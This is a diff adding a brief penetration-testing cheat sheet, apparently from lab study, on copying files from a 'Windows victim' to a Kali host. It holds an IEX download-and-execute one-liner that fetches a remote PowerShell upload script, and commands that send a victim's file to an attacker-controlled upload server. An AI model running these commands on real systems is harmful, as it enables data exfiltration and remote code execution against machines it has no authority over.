@@ -1,0 +1,14 @@
+We can use diffrent methods to transfer file from Windows victim to kali 
+
+Option 1) Using base 64 
+    Step 1) [Convert]::ToBase64String((Get-Content -path "<File path e.g. C:\Windows\system32\drivers\etc\hosts>" -Encoding byte))
+    Step 2) echo <base 64 from step 1> | base64 -d <output file name>
+
+Option2) PowerShell Web Uploads :- We can run the upload server in kali to get file from Windows victim 
+    Step 1) python3 -m uploadserver :- Start the upload server in klai 
+            File upload available at /upload
+            Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
+
+    Step 2) IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') :- Download the pwershell program to be used for transfer
+    Step 3) Invoke-FileUpload -Uri http://<Kali IP address:Port>/upload -File <File path e.g. C:\Windows\System32\drivers\etc\hosts>
+      
